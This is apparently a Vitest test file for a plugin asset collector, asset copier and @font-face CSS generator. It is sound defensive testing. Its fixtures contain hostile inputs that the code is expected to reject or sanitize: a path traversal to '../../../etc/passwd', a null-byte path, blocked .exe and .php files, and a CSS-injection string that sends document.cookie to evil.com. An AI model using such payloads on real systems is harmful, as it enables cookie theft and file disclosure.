/**
 * Tests for plugin asset collection, copying, and @font-face generation
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdirSync, writeFileSync, rmSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

import {
  collectPluginAssets,
  filterAssetsByPlugin,
  getPluginIdsFromAssets,
} from '../assetCollector.js';
import { copyPluginAssets, formatBytes } from '../assetCopier.js';
import {
  generateFontFaceCSS,
  generateFontFaceCSSForPlugin,
  getFontFamilies,
  sanitizeFontFamily,
} from '../fontFaceGenerator.js';
import { ThemeBase } from '../ThemeBase.js';
import type { PluginAssetDefinition } from '../../core/types.js';

// Test plugin with font assets
class TestPluginWithFonts extends ThemeBase {
  readonly id = 'test-plugin';
  readonly version = '1.0.0';

  getAssets(): PluginAssetDefinition[] {
    return [
      {
        type: 'font',
        path: 'fonts/TestFont.woff2',
        family: 'Test Font',
        weight: '400 700',
        style: 'normal',
        display: 'swap',
      },
      {
        type: 'other',
        path: 'fonts/LICENSE.txt',
      },
    ];
  }

  register(): void {
    // No-op for testing
  }
}

// Test plugin without assets
class TestPluginNoAssets extends ThemeBase {
  readonly id = 'no-assets-plugin';
  readonly version = '1.0.0';

  register(): void {
    // No-op for testing
  }
}

describe('Asset Collection', () => {
  let testDir: string;
  let pluginsDir: string;

  beforeEach(() => {
    // Create temp directory structure
    testDir = join(tmpdir(), `blueprint-test-${Date.now()}`);
    pluginsDir = join(testDir, 'plugins');

    // Create test plugin directory with assets
    const testPluginAssetsDir = join(
      pluginsDir,
      'test-plugin',
      'assets',
      'fonts'
    );
    mkdirSync(testPluginAssetsDir, { recursive: true });

    // Create dummy font file
    writeFileSync(
      join(testPluginAssetsDir, 'TestFont.woff2'),
      'dummy font data'
    );
    writeFileSync(join(testPluginAssetsDir, 'LICENSE.txt'), 'MIT License');
  });

  afterEach(() => {
    // Clean up
    if (existsSync(testDir)) {
      rmSync(testDir, { recursive: true, force: true });
    }
  });

  it('should collect assets from plugins', async () => {
    const plugin = new TestPluginWithFonts();
    const assets = await collectPluginAssets([plugin], pluginsDir);

    expect(assets).toHaveLength(2);
    expect(assets[0].pluginId).toBe('test-plugin');
    expect(assets[0].definition.type).toBe('font');
    expect(assets[0].targetPath).toBe(
      'test-plugin/assets/fonts/TestFont.woff2'
    );
  });

  it('should return empty array for plugins without assets', async () => {
    const plugin = new TestPluginNoAssets();
    const assets = await collectPluginAssets([plugin], pluginsDir);

    expect(assets).toHaveLength(0);
  });

  it('should throw on path traversal attempt', async () => {
    class MaliciousPlugin extends ThemeBase {
      readonly id = 'malicious';
      readonly version = '1.0.0';

      getAssets(): PluginAssetDefinition[] {
        return [{ type: 'other', path: '../../../etc/passwd' }];
      }

      register(): void {}
    }

    const plugin = new MaliciousPlugin();
    await expect(collectPluginAssets([plugin], pluginsDir)).rejects.toThrow(
      'must be relative without traversal'
    );
  });

  it('should throw on blocked file extension', async () => {
    class BlockedPlugin extends ThemeBase {
      readonly id = 'blocked';
      readonly version = '1.0.0';

      getAssets(): PluginAssetDefinition[] {
        return [{ type: 'other', path: 'malware.exe' }];
      }

      register(): void {}
    }

    const plugin = new BlockedPlugin();
    await expect(collectPluginAssets([plugin], pluginsDir)).rejects.toThrow(
      'Blocked file type'
    );
  });

  it('should throw on invalid extension for type', async () => {
    class WrongExtPlugin extends ThemeBase {
      readonly id = 'wrong-ext';
      readonly version = '1.0.0';

      getAssets(): PluginAssetDefinition[] {
        return [
          {
            type: 'font',
            path: 'fonts/font.png',
            family: 'Test',
            weight: '400',
          },
        ];
      }

      register(): void {}
    }

    const plugin = new WrongExtPlugin();
    await expect(collectPluginAssets([plugin], pluginsDir)).rejects.toThrow(
      'not allowed for type "font"'
    );
  });

  it('should throw on missing file', async () => {
    class MissingFilePlugin extends ThemeBase {
      readonly id = 'missing';
      readonly version = '1.0.0';

      getAssets(): PluginAssetDefinition[] {
        return [
          {
            type: 'font',
            path: 'fonts/Missing.woff2',
            family: 'Missing',
            weight: '400',
          },
        ];
      }

      register(): void {}
    }

    const plugin = new MissingFilePlugin();
    await expect(collectPluginAssets([plugin], pluginsDir)).rejects.toThrow(
      'Asset file not found'
    );
  });

  it('should throw on null byte in path', async () => {
    class NullBytePlugin extends ThemeBase {
      readonly id = 'null-byte';
      readonly version = '1.0.0';

      getAssets(): PluginAssetDefinition[] {
        return [{ type: 'other', path: 'fonts/file\x00.txt' }];
      }

      register(): void {}
    }

    const plugin = new NullBytePlugin();
    await expect(collectPluginAssets([plugin], pluginsDir)).rejects.toThrow(
      'Invalid null byte'
    );
  });

  it('should block additional scripting extensions (.php, .py, .rb)', async () => {
    class PhpPlugin extends ThemeBase {
      readonly id = 'php-plugin';
      readonly version = '1.0.0';

      getAssets(): PluginAssetDefinition[] {
        return [{ type: 'other', path: 'script.php' }];
      }

      register(): void {}
    }

    const plugin = new PhpPlugin();
    await expect(collectPluginAssets([plugin], pluginsDir)).rejects.toThrow(
      'Blocked file type'
    );
  });

  it('should filter assets by plugin ID', async () => {
    const plugin = new TestPluginWithFonts();
    const assets = await collectPluginAssets([plugin], pluginsDir);

    const filtered = filterAssetsByPlugin(assets, 'test-plugin');
    expect(filtered).toHaveLength(2);

    const filteredOther = filterAssetsByPlugin(assets, 'other-plugin');
    expect(filteredOther).toHaveLength(0);
  });

  it('should get unique plugin IDs from assets', async () => {
    const plugin = new TestPluginWithFonts();
    const assets = await collectPluginAssets([plugin], pluginsDir);

    const pluginIds = getPluginIdsFromAssets(assets);
    expect(pluginIds).toEqual(['test-plugin']);
  });
});

describe('Asset Copying', () => {
  let testDir: string;
  let pluginsDir: string;
  let outputDir: string;

  beforeEach(() => {
    testDir = join(tmpdir(), `blueprint-test-${Date.now()}`);
    pluginsDir = join(testDir, 'plugins');
    outputDir = join(testDir, 'output');

    const testPluginAssetsDir = join(
      pluginsDir,
      'test-plugin',
      'assets',
      'fonts'
    );
    mkdirSync(testPluginAssetsDir, { recursive: true });
    mkdirSync(outputDir, { recursive: true });

    writeFileSync(
      join(testPluginAssetsDir, 'TestFont.woff2'),
      'dummy font data'
    );
    writeFileSync(join(testPluginAssetsDir, 'LICENSE.txt'), 'MIT License');
  });

  afterEach(() => {
    if (existsSync(testDir)) {
      rmSync(testDir, { recursive: true, force: true });
    }
  });

  it('should copy assets to output directory', async () => {
    const plugin = new TestPluginWithFonts();
    const assets = await collectPluginAssets([plugin], pluginsDir);
    const result = await copyPluginAssets(assets, outputDir);

    expect(result.copied).toHaveLength(2);
    expect(result.warnings).toHaveLength(0);

    const fontPath = join(
      outputDir,
      'test-plugin',
      'assets',
      'fonts',
      'TestFont.woff2'
    );
    expect(existsSync(fontPath)).toBe(true);
  });
});

describe('Font Face Generation', () => {
  let testDir: string;
  let pluginsDir: string;

  beforeEach(() => {
    testDir = join(tmpdir(), `blueprint-test-${Date.now()}`);
    pluginsDir = join(testDir, 'plugins');

    const testPluginAssetsDir = join(
      pluginsDir,
      'test-plugin',
      'assets',
      'fonts'
    );
    mkdirSync(testPluginAssetsDir, { recursive: true });

    writeFileSync(
      join(testPluginAssetsDir, 'TestFont.woff2'),
      'dummy font data'
    );
    writeFileSync(join(testPluginAssetsDir, 'LICENSE.txt'), 'MIT License');
  });

  afterEach(() => {
    if (existsSync(testDir)) {
      rmSync(testDir, { recursive: true, force: true });
    }
  });

  it('should generate @font-face CSS', async () => {
    const plugin = new TestPluginWithFonts();
    const assets = await collectPluginAssets([plugin], pluginsDir);
    const css = generateFontFaceCSS(assets);

    expect(css).toContain('@font-face');
    expect(css).toContain("font-family: 'Test Font'");
    expect(css).toContain("url('./assets/fonts/TestFont.woff2')");
    expect(css).toContain("format('woff2')");
    expect(css).toContain('font-weight: 400 700');
    expect(css).toContain('font-style: normal');
    expect(css).toContain('font-display: swap');
  });

  it('should return empty string for no font assets', async () => {
    const plugin = new TestPluginNoAssets();
    const assets = await collectPluginAssets([plugin], pluginsDir);
    const css = generateFontFaceCSS(assets);

    expect(css).toBe('');
  });

  it('should generate CSS for specific plugin', async () => {
    const plugin = new TestPluginWithFonts();
    const assets = await collectPluginAssets([plugin], pluginsDir);
    const css = generateFontFaceCSSForPlugin(assets, 'test-plugin');

    expect(css).toContain('@font-face');
  });

  it('should get font families from assets', async () => {
    const plugin = new TestPluginWithFonts();
    const assets = await collectPluginAssets([plugin], pluginsDir);
    const families = getFontFamilies(assets);

    expect(families).toEqual(['Test Font']);
  });
});

describe('Font Family Sanitization', () => {
  it('should pass through normal font names unchanged', () => {
    expect(sanitizeFontFamily('Figtree')).toBe('Figtree');
    expect(sanitizeFontFamily('Open Sans')).toBe('Open Sans');
    expect(sanitizeFontFamily('SF Pro Display')).toBe('SF Pro Display');
  });

  it('should remove single quotes that could break CSS', () => {
    // Malicious input that tries to break out of the font-family string
    // and inject CSS rules
    expect(
      sanitizeFontFamily(
        "Figtree'; } body { display: none; } @font-face { font-family: 'x"
      )
    ).toBe('Figtree  body  display: none  @font-face  font-family: x');
  });

  it('should remove double quotes', () => {
    expect(sanitizeFontFamily('Malicious"Font')).toBe('MaliciousFont');
  });

  it('should remove backslashes', () => {
    expect(sanitizeFontFamily('Test\\Font')).toBe('TestFont');
  });

  it('should remove semicolons', () => {
    // Semicolons are removed because they terminate CSS declarations
    expect(sanitizeFontFamily('Test; color: red')).toBe('Test color: red');
  });

  it('should remove braces', () => {
    expect(sanitizeFontFamily('Test{bad}Font')).toBe('TestbadFont');
  });

  it('should remove parentheses', () => {
    expect(sanitizeFontFamily('Test(bad)Font')).toBe('TestbadFont');
  });

  it('should remove newlines', () => {
    expect(sanitizeFontFamily('Test\nFont')).toBe('TestFont');
    expect(sanitizeFontFamily('Test\rFont')).toBe('TestFont');
  });

  it('should neutralize a complete CSS injection attack', () => {
    // Full attack string that would inject a malicious CSS rule
    const attack =
      "'; } * { background: url('evil.com/steal?cookie=' + document.cookie); } .x { font-family: '";
    const sanitized = sanitizeFontFamily(attack);

    // Should not contain any characters that could break CSS parsing
    expect(sanitized).not.toContain("'");
    expect(sanitized).not.toContain('"');
    expect(sanitized).not.toContain('{');
    expect(sanitized).not.toContain('}');
    expect(sanitized).not.toContain(';');
    expect(sanitized).not.toContain('(');
    expect(sanitized).not.toContain(')');
  });
});

describe('Utility Functions', () => {
  it('should format bytes correctly', () => {
    expect(formatBytes(500)).toBe('500 B');
    expect(formatBytes(1024)).toBe('1.0 KB');
    expect(formatBytes(1536)).toBe('1.5 KB');
    expect(formatBytes(1024 * 1024)).toBe('1.0 MB');
    expect(formatBytes(1.5 * 1024 * 1024)).toBe('1.5 MB');
  });
});
